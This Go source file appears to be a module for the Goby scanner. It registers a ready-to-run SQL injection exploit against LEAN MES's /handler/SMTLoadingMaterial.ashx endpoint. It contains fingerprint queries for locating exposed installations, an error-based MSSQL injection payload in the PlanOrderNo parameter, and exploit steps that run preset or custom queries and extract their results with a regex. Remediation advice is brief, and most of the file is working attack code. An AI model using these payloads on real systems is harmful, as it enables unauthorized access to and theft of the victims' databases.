package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "LEAN MES /handler/SMTLoadingMaterial.ashx SQL Injection Vulnerability",
    "Description": "<p>LEAN MES is a system developed by Shenzhen Shenke Information Technology Co., Ltd., mainly used for workshop management functions such as production scheduling, product tracking, and quality control. LEAN MES emphasizes the informatization and transparency of the manufacturing process, helping enterprises upgrade from extensive to lean management models. The system has a SQL injection vulnerability in the /handler/SMTLoadingMaterial.ashx interface, allowing attackers to construct malicious SQL statements to obtain sensitive information from the database or perform unauthorized operations, potentially leading to data leakage, tampering, or system crashes.</p>",
    "Product": "LEAN MES",
    "Homepage": "https://www.sz-skt.com/mescloud.html",
    "DisclosureDate": "2025-01-03",
    "PostTime": "2025-01-15",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "(title=\"LEAN MES - 用户登录\" && body=\"LEAN MES\") || body=\"Content/js/skt.utility.checkmobile.js\" || body=\"../MobileApp/VerifyError.aspx\" || body=\"Content/login/login2/multiplant_top.png\"",
    "GobyQuery": "(title=\"LEAN MES - 用户登录\" && body=\"LEAN MES\") || body=\"Content/js/skt.utility.checkmobile.js\" || body=\"../MobileApp/VerifyError.aspx\" || body=\"Content/login/login2/multiplant_top.png\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database or perform unauthorized operations through SQL injection, potentially leading to data leakage, tampering, or system crashes. Additionally, attackers may execute commands with high privileges, further compromising the server's system permissions.</p>",
    "Recommendation": "<p>1. Strictly filter and validate input parameters to avoid directly concatenating user input into SQL statements.2. Use parameterized queries or prepared statements to prevent SQL injection attacks.3. Restrict database user permissions to avoid misuse of high-privilege accounts.4. Disable exposed interfaces on the Internet or set access permissions for interfaces.5. Upgrade the system to the secure version provided by the vendor.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144982566?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT DB_NAME(),SELECT @@VERSION,SELECT SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/handler/SMTLoadingMaterial.ashx",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.10 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "type=GetOrderList&PlanOrderNo=1%27+AND+4477+IN+%28SELECT+%28CHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%2B%28SELECT+SUBSTRING%28sys.fn_sqlvarbasetostr%28HASHBYTES%28%27MD5%27%2C+%27{{{rand_int}}}%27%29%29%2C+3%2C+32%29%29%2BCHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%29%29--+rFZe"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/handler/SMTLoadingMaterial.ashx",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.10 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "type=GetOrderList&PlanOrderNo=1%27+AND+4477+IN+%28SELECT+%28CHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%2B%28{{{payload}}}%29%2BCHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%29%29--+rFZe"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}type=GetOrderList&PlanOrderNo=1*"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "深科特 LEAN MES系统 /handler/SMTLoadingMaterial.ashx SQL 注入漏洞",
            "Product": "LEAN MES",
            "Description": "<p>LEAN MES系统是由深圳市深科特信息技术有限公司开发的一款应用系统，主要用于生产调度、产品跟踪、质量控制等车间管理功能。LEAN MES精益制造执行系统通过强调制造过程的信息化和透明化，帮助企业由粗放式向精益化管理模式升级。该系统/handler/SMTLoadingMaterial.ashx接口存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息或对数据库进行未授权操作，可能导致数据泄露、篡改或系统崩溃。</p>",
            "Recommendation": "<p>1. 对输入参数进行严格的过滤和验证，避免直接拼接用户输入到SQL语句中。2. 使用参数化查询或预编译语句来防止SQL注入攻击。3. 限制数据库用户权限，避免高权限账户被滥用。4. 关闭互联网暴露面或接口设置访问权限。5. 升级系统至厂商提供的安全版本。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库中的敏感信息或执行未授权操作，可能导致数据泄露、数据篡改或系统崩溃等严重后果。此外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "LEAN MES /handler/SMTLoadingMaterial.ashx SQL Injection Vulnerability",
            "Product": "LEAN MES",
            "Description": "<p>LEAN MES is a system developed by Shenzhen Shenke Information Technology Co., Ltd., mainly used for workshop management functions such as production scheduling, product tracking, and quality control. LEAN MES emphasizes the informatization and transparency of the manufacturing process, helping enterprises upgrade from extensive to lean management models. The system has a SQL injection vulnerability in the /handler/SMTLoadingMaterial.ashx interface, allowing attackers to construct malicious SQL statements to obtain sensitive information from the database or perform unauthorized operations, potentially leading to data leakage, tampering, or system crashes.</p>",
            "Recommendation": "<p>1. Strictly filter and validate input parameters to avoid directly concatenating user input into SQL statements.2. Use parameterized queries or prepared statements to prevent SQL injection attacks.3. Restrict database user permissions to avoid misuse of high-privilege accounts.4. Disable exposed interfaces on the Internet or set access permissions for interfaces.5. Upgrade the system to the secure version provided by the vendor.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database or perform unauthorized operations through SQL injection, potentially leading to data leakage, tampering, or system crashes. Additionally, attackers may execute commands with high privileges, further compromising the server's system permissions.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "rand_int": "define|variable|{{{rand|int|8}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/handler/SMTLoadingMaterial.ashx"
    },
    "VariablesOrder": [
        "payload",
        "rand_int",
        "rand_int_md5",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9983"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}